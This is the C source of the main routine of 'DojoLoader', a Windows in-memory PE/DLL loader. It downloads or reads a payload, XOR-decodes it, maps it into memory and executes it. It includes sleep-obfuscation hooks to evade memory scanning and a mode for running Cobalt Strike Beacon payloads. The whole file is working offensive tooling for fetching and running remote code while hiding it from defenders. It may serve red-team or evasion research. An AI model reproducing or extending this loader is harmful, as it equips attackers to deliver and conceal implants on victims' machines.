#include <Windows.h>
#include <stdio.h>
#include "memloader.h"
#include "utils.h"
#include "structs.h"
#include "hooks.h"



typedef void** HMEMMODULE;

struct CONFIG Configs = { .SleepXorKey = "DefaultSleepXorKey_changeme"};

PVOID lpBaseArray[SIZE_ARRAY] = { 0 };
SIZE_T TSizeArray[SIZE_ARRAY] = { 0 };
int index = 0;


DWORD Run(PVOID pDllBytes) {
	DWORD Error;
	HMEMMODULE hMemModule = NULL;
	hMemModule = LoadMod(pDllBytes, TRUE, &Error);
	DllPayload.Module = hMemModule;
	return Error;
}

void FreeRawModule(PVOID pDllBytes) {
	printf("\n");
	for (int i = 0; i < index ; i++){
		
		if (!VirtualFree(lpBaseArray[i], TSizeArray[i], MEM_DECOMMIT)) {
			printf("\t[i] VirtualFree error: %d at index : %d \n", GetLastError(), i);
		}
	}
	if (DllPayload.BytesNumber){
		ZeroMemory(pDllBytes, DllPayload.BytesNumber);
	}
}

void printHelp(wchar_t* programNameW) {
	char programNameA[260]; 
	WideCharToMultiByte(CP_UTF8, 0, programNameW, -1, programNameA, sizeof(programNameA), NULL, NULL);

	wprintf(L"Usage: %ls -d <url> | -f <file> [-k <key>] [-s <function>] [-beacon]\n", programNameW);
	printf("Options:\n");
	printf("  -d -download <url> \t Load PE from the specified URL\n");
	printf("  -f -file <file> \t\t Load PE from the specified file\n");
	printf("  -k -key <key> \t\t XOR the payload with the specified key\n");
	printf("  -s -sleep <1 (membounce),2 (memhop),3 (RWRX)> \t Sleep Obfuscation techniques:\n\t\t 1 or membounce for MemoryBouncing\n\t\t 2 or memhop for Memory Hopping (choose a compatible payload)\n\t\t 3 or RWRX for classic RW->RX \n");
	printf("  -beacon \t\t use Cobalt Strike UDRL-les Beacon payload execution method\n");
	printf("  -h \t\t\t print this help\n");
}

int wmain(int argc, wchar_t* argv[]) {
	BOOL Succ;
	PVOID pDllBytes;
	HMEMMODULE hMemModule = NULL;
	DWORD Error;
	char* url = NULL;
	char* filePath = NULL;
	char* key = NULL;

	LPWSTR* szArglist;
	int nArgs;

	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist) {
		wprintf(L"CommandLineToArgvW fail\n");
		return 0;
	}
	else {
		for (int i = 0; i < nArgs; i++) {
			printf("%d: %ws\n", i, szArglist[i]);
		}
	}

	printf(
		"______      _       _                     _           \n"
		"|  _  \\    (_)     | |                   | |          \n"
		"| | | |___  _  ___ | |     ___   __ _  __| | ___ _ __ \n"
		"| | | / _ \\| |/ _ \\| |    / _ \\ / _` |/ _` |/ _ \\ '__|\n"
		"| |/ / (_) | | (_) | |___| (_) | (_| | (_| |  __/ |   \n"
		"|___/ \\___/| |\\___/\\_____ \\___/ \\__,_|\\__,_|\\___|_|   \n"
		"          _/ |                                        \n"
		"         |__/                                         \n"
		"\nAuthor: @naksyn\n\n"
	);

	
	if (argc == 1) {
		printHelp(argv[0]);
		return -1;
	}

	for (int i = 0; i < nArgs; i++) {
		if (wcscmp(szArglist[i], L"-h") == 0) {
			printHelp(argv[0]);
			return 0; 
		}
	}

	for (int i = 1; i < nArgs; i++) {
		if (wcscmp(szArglist[i], L"-download") == 0 || wcscmp(szArglist[i], L"-d") == 0 && i + 1 < nArgs) {
			int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szArglist[++i], -1, NULL, 0, NULL, NULL);
			url = (char*)malloc(bufferSize);
			WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, url, bufferSize, NULL, NULL);
		}
		else if (wcscmp(szArglist[i], L"-file") == 0 || wcscmp(szArglist[i], L"-f") == 0 && i + 1 < nArgs) {
			int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szArglist[++i], -1, NULL, 0, NULL, NULL);
			filePath = (char*)malloc(bufferSize);
			WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, filePath, bufferSize, NULL, NULL);
		}
		else if (wcscmp(szArglist[i], L"-key") == 0 || wcscmp(szArglist[i], L"-k") == 0 && i + 1 < nArgs) {
			int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szArglist[++i], -1, NULL, 0, NULL, NULL);
			key = (char*)malloc(bufferSize);
			WideCharToMultiByte(CP_UTF8, 0, szArglist[i], -1, key, bufferSize, NULL, NULL);
			Configs.XorKey = key;
		}
		else if (wcscmp(szArglist[i], L"-beacon") == 0) {
			Configs.Beacon = TRUE;
		}
		else if (wcscmp(szArglist[i], L"-sleep") == 0 || wcscmp(szArglist[i], L"-s") == 0  && i + 1 < nArgs) {
			if (wcscmp(szArglist[++i], L"1") == 0 || wcscmp(szArglist[i], L"membounce") == 0) {
				Configs.SleepHookFunc = SleepHookMemoryBouncing;
			}
			else if (wcscmp(szArglist[i], L"2") == 0 || wcscmp(szArglist[i], L"memhop") == 0) {
				Configs.SleepHookFunc = SleepHookMemoryHopping;
			}
			else if (wcscmp(szArglist[i], L"3") == 0 || wcscmp(szArglist[i], L"RWRX") == 0) {
				Configs.SleepHookFunc = SleepHookRWRX;
			}
			else {
				wprintf(L"Unknown function: %ws\n", szArglist[i]);
				return -1;
			}
		}
		
		else {
			wprintf(L"[!] Unknown option: %ws\n", szArglist[i]);
			return -1;
		}
	}
	
	printf("URL: %s\n", url);
	if (url != NULL) {
		DWORD size;
		char* data = DownloadFile(url, &size);
		if (data != NULL)
		{
			if (Configs.XorKey != NULL) {
				printf("[!] Xoring payload with key: %s\n", Configs.XorKey);
				XORWithKey(data, size, Configs.XorKey);
			}
			DllPayload.BytesNumber = size;
			DllPayload.pDllBytes = data;
		}
		else {
			printf("[!] DownloadFile Failed With Error: %d \n", GetLastError());
			return -1;
		}
	}
	else if (filePath != NULL) {
		Succ = ReadDllFile(filePath);
		if (!Succ) {
			printf("[!] ReadDllFile Failed With Error: %d \n", GetLastError());
			return -1;
		}
		if (Configs.XorKey != NULL) {
			printf("[!] Xoring payload with key: %s\n", Configs.XorKey);
			XORWithKey(DllPayload.pDllBytes, DllPayload.BytesNumber, Configs.XorKey);
		}
	}
	else {
		printf("[!] Either -d (load PE from from URL) or -f (load PE from file) option must be specified\n");
		return -1;
	}

	pDllBytes = DllPayload.pDllBytes;
	if (pDllBytes == NULL) {
		printf("[!] pDllBytes is Null : %d \n", GetLastError());
		return -1;
	}


	printf("[+] Running\n");

	Error = Run(pDllBytes);
	if (Error != MMEC_OK) {
		printf("[!] Coudn't Run The Dll ... \n");
		FreeRawModule(pDllBytes);
		return -1;
	}
	printf("[+] DONE \n");
	FreeRawModule(pDllBytes);

	return 0;
}